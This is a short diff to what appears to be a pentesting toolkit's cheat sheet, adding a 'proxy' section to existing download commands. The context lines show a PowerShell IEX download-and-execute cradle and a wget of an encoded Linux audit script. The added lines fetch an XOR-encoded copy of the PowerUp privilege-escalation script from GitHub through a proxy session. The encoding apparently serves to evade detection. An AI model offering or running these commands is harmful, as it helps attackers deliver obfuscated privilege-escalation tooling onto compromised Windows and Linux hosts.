@@ -38,3 +38,11 @@ IEX(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/
 ```
 wget https://raw.githubusercontent.com/jdksec/jdk-tools/master/encoded/audit-linux.sh
 ```
+
+# proxy
+```
+$Proxy=New-object System.Net.WebProxy
+$WebSession=new-object Microsoft.PowerShell.Commands.WebRequestSession
+$WebSession.Proxy=$Proxy
+Invoke-webrequest -Method Get -Uri "https://github.com/jdksec/jdk-tools/raw/master/encoded/PowerUp-v2.ps1-xorencoded.ps1" -WebSession $WebSession -outfile pu.ps1
+```
